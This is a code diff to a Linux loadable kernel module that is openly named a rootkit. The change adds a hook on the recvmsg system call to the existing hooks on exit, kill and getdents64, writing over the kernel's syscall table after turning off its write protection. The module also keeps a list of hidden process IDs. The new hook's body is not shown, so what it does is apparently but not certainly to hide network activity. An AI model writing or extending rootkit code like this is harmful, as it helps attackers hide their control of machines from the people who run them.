@@ -9,6 +9,7 @@ sys_call_stub orig_exit;
 sys_call_stub orig_exit_group;
 sys_call_stub orig_kill;
 sys_call_stub orig_getdents64;
+sys_call_stub orig_recvmsg;
 
 struct semaphore hidden_pid_list_sem;
 
@@ -36,6 +37,7 @@ static int __init lkm_rootkit_init(void)
     orig_exit_group = (sys_call_stub)syscall_table[__NR_exit_group];
     orig_kill = (sys_call_stub)syscall_table[__NR_kill];
     orig_getdents64 = (sys_call_stub)syscall_table[__NR_getdents64];
+    orig_recvmsg = (sys_call_stub)syscall_table[__NR_recvmsg];
 
     disable_write_protect();
 
@@ -46,6 +48,8 @@ static int __init lkm_rootkit_init(void)
     syscall_table[__NR_exit_group] = (unsigned long)rk_exit_group;
     syscall_table[__NR_kill] = (unsigned long)rk_kill;
     syscall_table[__NR_getdents64] = (unsigned long)rk_getdents64;
+    syscall_table[__NR_recvmsg] = (unsigned long)rk_recvmsg;
+
     enable_write_protect();
 
     return 0;
@@ -67,6 +71,7 @@ static void __exit lmk_rootkit_exit(void)
     syscall_table[__NR_exit_group] = (unsigned long)orig_exit_group;
     syscall_table[__NR_kill] = (unsigned long)orig_kill;
     syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
+    syscall_table[__NR_recvmsg] = (unsigned long)orig_recvmsg;
 
     enable_write_protect();
 
